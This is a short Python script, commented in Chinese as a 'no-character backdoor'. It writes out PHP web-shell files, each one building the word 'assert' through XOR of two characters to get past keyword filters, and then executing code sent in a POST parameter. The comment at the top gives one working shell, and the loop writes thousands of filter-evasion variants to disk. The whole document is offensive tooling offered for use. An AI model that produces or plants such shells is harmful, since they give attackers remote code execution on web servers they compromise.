# 无字符后门
# <?php $a=('!'^'@').'ssert';$a($_POST[X]);?>
for i in range(1,127):
    for ii in range(1,127):

        code = "<?php $a=('"+chr(i)+"'^'"+chr(ii)+"').'ssert';$a($_POST[X]);?>"
        with open(str(i)+'ljw'+str(ii)+'.php','a+') as f:
            f.write(code)
            pass

        # print(code)